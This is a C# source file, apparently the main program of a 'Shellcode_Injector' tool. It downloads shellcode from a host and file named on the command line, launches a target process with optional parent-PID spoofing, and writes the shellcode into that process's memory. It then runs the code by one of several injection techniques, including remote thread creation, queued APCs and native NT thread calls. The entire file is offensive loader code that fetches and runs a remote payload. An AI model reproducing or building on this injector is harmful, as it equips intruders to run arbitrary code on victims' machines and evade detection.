using System;
using static Shellcode_Injector.WinApi;

namespace Shellcode_Injector
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //Initialize the class so the constructor can populate the static methods
            new WinApi();
            //Parse command line flags
            var arguments = new Parser(args);

            //Fetch shellcode
            byte[] shellcode = Helpers.Fetch(arguments.shellcode["host"], arguments.shellcode["file"]);

            //Create the process that will be injected
            WinApi.PIN pinfo = Helpers.StartS(
                (bool)arguments.process["spoof_ppid"],
                arguments.ppid,
                (string)arguments.process["cmd"],
                (string)arguments.process["cwd"]
                );

            //Memory allocation
            IntPtr mmr = IntPtr.Zero;
            switch (arguments.memory["technique"]) 
            {
                case "standard":
                    mmr = Helpers.MWrite(pinfo.hProcess, shellcode);
                    break;

                case "ntsection":
                    mmr = Helpers.NTMWrite(pinfo.hProcess, shellcode);
                    break;

                default:
                    Console.WriteLine("Memory allocation argument have a wrong value");
                    arguments.PrintHelp();
                    break;
            }

            //Shellcode execution
            switch (arguments.exec["technique"]) 
            {
                case "rthread":
                    Helpers.SCRun("crt", pinfo, mmr);
                    break;

                case "quapc":
                    Helpers.SCRun("qua", pinfo, mmr);
                    break;

                case "ntthread":
                    Helpers.NTSCRun("ncte", pinfo, mmr);
                    break;

                case "ntqathread":
                    Helpers.NTSCRun("nqat", pinfo, mmr);
                    break;

                default:
                    Console.WriteLine("Shellcode exec argument have a wrong value");
                    arguments.PrintHelp();
                    break;
            }
        }
    }
}
